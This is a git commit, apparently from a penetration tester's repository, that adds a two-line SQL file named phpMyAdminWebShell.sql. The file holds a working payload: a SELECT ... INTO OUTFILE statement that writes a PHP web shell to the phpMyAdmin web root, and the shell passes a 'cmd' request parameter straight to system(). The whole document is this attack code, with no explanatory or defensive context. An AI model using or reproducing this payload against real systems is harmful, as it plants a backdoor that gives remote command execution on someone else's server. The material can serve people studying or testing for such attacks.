15f9b9e4de1878c2d6a036999e4ce945a20d95a9
Scott Sutherland <nullbind@users.noreply.github.com>
2020-03-23 21:08:13 -0500

    Create phpMyAdminWebShell.sql

---
+++ random/phpMyAdminWebShell.sql
@@ -0,0 +1,2 @@
+SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
+INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
